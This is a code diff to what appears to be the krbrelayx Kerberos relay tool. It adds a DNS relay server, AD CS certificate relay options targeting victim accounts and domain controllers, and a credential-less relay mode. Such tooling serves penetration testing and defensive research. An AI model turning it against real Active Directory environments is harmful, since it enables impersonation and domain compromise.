@@ -34,7 +34,7 @@
 #
 # Ntlmrelayx authors:
 #  Alberto Solino (@agsolino)
-#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
+#  Dirk-jan Mollema / Outsider Security (www.outsidersecurity.nl)
 #
 
 import argparse
@@ -46,10 +46,10 @@ from impacket.examples import logger
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 
-from lib.servers import SMBRelayServer, HTTPKrbRelayServer
+from lib.servers import SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer
 from lib.utils.config import KrbRelayxConfig
 
-RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer )
+RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer )
 
 def stop_servers(threads):
     todelete = []
@@ -85,7 +85,9 @@ def main():
                 c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, binascii.unhexlify(options.krbhexpass), options.krbsalt, True)
             else:
                 c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, options.krbpass, options.krbsalt, False)
-            c.setKrbOptions(options.format)
+            c.setKrbOptions(options.format, options.victim)
+            c.setIsADCSAttack(options.adcs)
+            c.setADCSOptions(options.template)
 
             #If the redirect option is set, configure the HTTP server to redirect targets to SMB
             if server is HTTPKrbRelayServer and options.r is not None:
@@ -102,8 +104,8 @@ def main():
 
     #Parse arguments
     parser = argparse.ArgumentParser(add_help=False,
-                                     description="Kerberos \"relay\" tool. Abuses accounts with unconstrained "
-                                                  "delegation to pwn things.")
+                                     description="Kerberos relay and unconstrained delegation abuse tool. "
+                                                  "By @_dirkjan / dirkjanm.io")
     parser._optionals.title = "Main options"
 
     #Main arguments
@@ -115,7 +117,6 @@ def main():
                                                                              'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
-
 
     # Interface address specification
     parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
@@ -171,6 +172,12 @@ def main():
     ldapoptions.add_argument('--add-computer', action='store_true', required=False, help='Attempt to add a new computer account')
     ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
 
+    # AD CS options
+    adcsoptions = parser.add_argument_group("AD CS attack options")
+    adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
+    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
+    adcsoptions.add_argument('-v', "--victim", action='store', metavar = 'TARGET', help='Victim username or computername$, to request the correct certificate name.')
+
     try:
         options = parser.parse_args()
     except Exception as e:
@@ -205,9 +212,18 @@ def main():
             targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
             mode = 'ATTACK'
         else:
-            logging.info("Running in export mode (all tickets will be saved to disk)")
+            logging.info("Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.")
             targetSystem = None
             mode = 'EXPORT'
+
+    if not options.krbpass and not options.krbhexpass and not options.hashes and not options.aesKey:
+        logging.info("Running in kerberos relay mode because no credentials were specified.")
+        if mode == 'EXPORT':
+            logging.error('You need to specify at least one relay target, or specify credentials to run in unconstrained delegation mode')
+            return
+        mode = 'RELAY'
+    else:
+        logging.info("Running in unconstrained delegation abuse mode using the specified credentials.")
 
     if options.r is not None:
         logging.info("Running HTTP server in redirect mode")
